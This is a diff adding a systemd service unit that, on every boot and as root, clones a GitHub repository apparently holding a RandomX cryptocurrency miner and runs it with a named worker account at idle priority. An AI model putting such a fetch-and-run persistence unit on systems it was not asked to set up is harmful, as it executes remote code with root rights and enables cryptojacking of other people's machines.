@@ -1,0 +1,19 @@
+[Unit]
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+ExecStart=bash -c 'cd `mktemp`; git clone https://github.com/shynur/my-miner build; ./build/start.bash -a rx -u shynur996.seer_server'
+
+Restart=always
+RestartSec=10
+
+Nice=19
+CPUSchedulingPolicy=idle
+IOSchedulingClass=3
+
+User=root
+Group=root
+
+[Install]
+WantedBy=multi-user.target
